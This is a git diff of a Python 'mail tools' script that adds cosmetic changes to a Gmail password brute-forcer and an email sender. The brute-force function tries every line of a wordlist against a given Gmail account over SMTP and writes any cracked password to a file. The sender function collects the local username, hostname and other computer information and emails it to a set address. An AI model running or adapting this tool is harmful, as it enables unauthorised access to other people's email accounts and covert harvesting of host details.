@@ -11,14 +11,15 @@ from email.message import EmailMessage
 import sys
 
 # github.com/vLeeH - 2021
-# Disable the less secure apps in your google account.
+# Disable the less secure apps in your google account to he Mail Sender.
 
-def banner():
-    # The banner of the email tools. 
+
+def __start__():
+    '''The banner of the email tools.'''
     os.system('cls' if os.name == 'nt' else 'clear') 
     sleep(0.5)
     mail_banner ='''\033[31m
-      __  __      _ _   ___          _        __                
+      __  __      _ _   ___          _        ____                 
      |  \/  |__ _(_) | | _ )_ _ _  _| |_ ___  | __|__ _ _ __ ___ 
      | |\/| / _` | | | | _ \ '_| || |  _/ -_) | _/ _ \ '_/ _/ -_)
      |_|  |_\__,_|_|_| |___/_|  \_,_|\__\___| |_|\___/_| \__\___|
@@ -30,35 +31,35 @@ def banner():
 
 
 def __MailBrute__(): 
-    # Get the email password
+    '''Get the email password'''
     gmail = str(input("[*] Enter the email: "))
     i = 0
     try:
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.ehlo()
-        passwfile = open('src/wordlists/wordlist.txt', 'r')
+        passwfile = open('packages/wordlists/wordlist.txt', 'r')
         pass_list = passwfile.readlines()
         for password in pass_list:
             i += 1
             print(f'[{str(i)}' + '/' + f'{str(len(pass_list))}]')
             try:
                 server.login(gmail, password)
-                os.system('cls' if os.name == 'nt' else 'clear')
+                sleep(1)
                 print()
-                print(f'[+] Email: {gmail} - Password founded: {password}')
+                print(f'\033[92;1m [+] Email: {gmail} - Password founded: {password} \033[0m')
                 with open('password.txt', 'at+', encoding='utf-8') as p: 
-                    p.write(f'[+] Email: {gmail} - Password founded: {password}')
+                    p.write(f'[+] Email: {gmail} - Password founded: {password}\n')
 
                 break
 
             except smtplib.SMTPAuthenticationError as e:
                 error = str(e)
                 if error[14] == '<':
-                    system('cls' if os.name == 'nt' else 'clear')
-                    main()
-                    print(f'[+] Email: {gmail} - Password founded: {password}')
+                    sleep(1)
+                    print()
+                    print(f'\033[92;1m [+] Email: {gmail} - Password founded: {password} \033[0m')
                     with open('password.txt', 'at+', encoding='utf-8') as p: 
-                        p.write(f'[+] Email: {gmail} - Password founded: {password}')
+                        p.write(f'[+] Email: {gmail} - Password founded: {password}\n')
 
                     break
 
@@ -70,10 +71,14 @@ def __MailBrute__():
         print(f'\033[31m ![ERROR] {ex}\033[0m')
 
     finally: 
+        sleep(1)
+        print()
         print('[-] Email brute force finished!')
 
 
 def __MailSender__(send_email, rec_email, password): 
+    '''Send emails with computer informations, html messages and files'''
+
     # Computer Informations
     username = getpass.getuser()
     hostname = socket.gethostname()
@@ -100,7 +105,8 @@ def __MailSender__(send_email, rec_email, password):
         </html>
     '''.format(inf), subtype='html')
 
-    # Send Files
+    ####### Send Files and Images #######
+
     # files= ['directory/image.jpg']
     # for file in files: 
     #     try: 
@@ -133,7 +139,7 @@ def __MailSender__(send_email, rec_email, password):
 
 
 if __name__=='__main__': 
-    banner()
+    __start__()
     print()
     while True: 
         ask1 = str(input('[*] Do you wanna use mail tools?(y/n) ')).strip().lower()
@@ -146,9 +152,10 @@ if __name__=='__main__':
                 print()
                 print('[+] Starting the Sender tool...')
                 sleep(2)
-                
+
                 # Credentials
                 # Enter the emails that will send and receive here, and in the .env file.
+
                 send_email = os.getenv('SEND_MAIL')
                 rec_email = os.getenv('REC_EMAIL')
                 password = getpass.getpass('[*] Enter your password: ')
